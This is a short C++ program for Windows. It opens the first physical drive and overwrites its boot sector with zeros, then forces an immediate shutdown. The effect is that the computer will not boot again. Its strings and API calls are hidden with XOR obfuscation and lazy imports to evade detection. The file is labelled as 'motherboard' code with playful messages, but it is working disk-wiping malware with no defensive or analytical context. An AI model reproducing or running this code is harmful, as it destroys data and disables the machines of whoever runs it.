#include <Windows.h>
#include <iostream>
#include "lazy_importer.hpp"
#include "xorstr.hpp"

using namespace std;

#define motherboard_size 512 //Default size

int main()
{
    char* message1 = new char[512];
    sprintf(message1, XorStr("Hi World ( :"));

    char* message2 = new char[512];
    sprintf(message2, XorStr("I'm sad ) :"));

    DWORD write_memory;
    char motherboard_data[motherboard_size]; //Default value is 512 in #define we will tho use 256

    ZeroMemory(&motherboard_data, (sizeof motherboard_data)); //Rewrite the memory

    HANDLE motherboard_record = CreateFile(XorStr("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    if (WriteFile(motherboard_record, motherboard_data, motherboard_size, &write_memory, NULL) == TRUE) {

        cout << message1; //ShowUp message "Hi World (:"

        //Delete strings from memory, after use.
        memset(message1, 0x00, 512);
        delete[] message1;

        LI_FN(Sleep)(1000); //Sleep this process for 1second
        LI_FN(system)(XorStr("shutdown -s -t 1")); //Shutdown computer in 1 second after success use
        LI_FN(ExitProcess)(0); //Terminate this process
    }
    else
    {
        cout << message2; //ShowUp message "I'm sad ) :"

        //Delete strings from memory, after use.
        memset(message2, 0x00, 512);
        delete[] message2;

        LI_FN(Sleep)(1000); //Sleep this process for 1second
        LI_FN(ExitProcess); //Terminate this process
    }
    LI_FN(CloseHandle)(motherboard_record); //Close handle of program

    return EXIT_SUCCESS;
}